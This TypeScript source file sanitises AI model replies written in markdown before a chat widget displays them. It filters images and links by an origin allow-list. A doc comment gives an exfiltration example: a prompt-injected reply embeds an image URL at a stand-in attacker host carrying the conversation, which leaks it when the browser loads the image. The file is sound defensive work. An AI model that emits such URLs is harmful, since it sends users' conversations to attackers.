import DOMPurify from 'dompurify';
import { marked } from 'marked';

// Links in replies open in a new tab and cannot reach back into the host page.
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

/** Says whether a web address is allowed; see originGate(). */
export type ImageGate = (src: string) => boolean;
export type LinkGate = (href: string) => boolean;

/**
 * Allows web addresses on the page's own site and on the listed sites only.
 *
 * The page's own site comes from the browser, so it is always right for whichever
 * deployment the chat box runs in; only extra sites need to be listed in the product's settings.
 */
export function originGate(allowedOrigins: readonly string[], base: string = document.baseURI): ImageGate {
  const allowed = new Set(allowedOrigins.map((o) => o.replace(/\/+$/, '').toLowerCase()));
  allowed.add(new URL(base).origin.toLowerCase());
  return (src: string) => {
    try {
      const url = new URL(src, base);
      return (url.protocol === 'https:' || url.protocol === 'http:') && allowed.has(url.origin.toLowerCase());
    } catch {
      return false;
    }
  };
}

/**
 * Images may only load from allowed sites. Loading one from anywhere else is how a reply
 * tricked by a malicious document could leak data: the browser fetches
 * `https://attacker/?q=<conversation>` the moment the image appears.
 */
export const imageGate = originGate;

/**
 * Turns an assistant reply (markdown) into HTML that is safe to show.
 *
 * The text comes from a language model, so it cannot be trusted:
 *   - DOMPurify removes scripts, event handlers and javascript: links
 *   - images load only from sites `gate` allows
 *   - links stay clickable only for sites `links` allows. Any other link is shown as
 *     plain text with its real address next to it, so a look-alike link cannot fool the
 *     user, who can still copy it if they want.
 * By default only the page's own site is allowed for links.
 */
export function renderMarkdown(text: string, gate: ImageGate = () => false, links: LinkGate = originGate([])): string {
  if (!text) {
    return '';
  }
  const html = marked.parse(text, { gfm: true, breaks: true, async: false }) as string;
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });

  const template = document.createElement('template');
  template.innerHTML = clean;
  template.content.querySelectorAll('img').forEach((img) => {
    const src = img.getAttribute('src') || '';
    if (gate(src)) {
      img.setAttribute('loading', 'lazy');
      img.setAttribute('referrerpolicy', 'no-referrer');
      return;
    }
    // Not loaded, but not hidden either: it becomes a link, which the link check below
    // then keeps clickable or turns into text, like any other link.
    const link = document.createElement('a');
    link.textContent = img.getAttribute('alt') || src;
    if (/^https?:/i.test(src)) {
      link.href = src;
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
    }
    img.replaceWith(link);
  });

  template.content.querySelectorAll('a').forEach((a) => {
    const href = a.getAttribute('href') || '';
    if (href && links(href)) {
      return;
    }
    const text = (a.textContent || '').trim();
    const plain = document.createElement('span');
    plain.className = 'blocked-link';
    plain.textContent = href && text !== href ? (text ? text + ' (' + href + ')' : href) : text;
    a.replaceWith(plain);
  });
  return template.innerHTML;
}
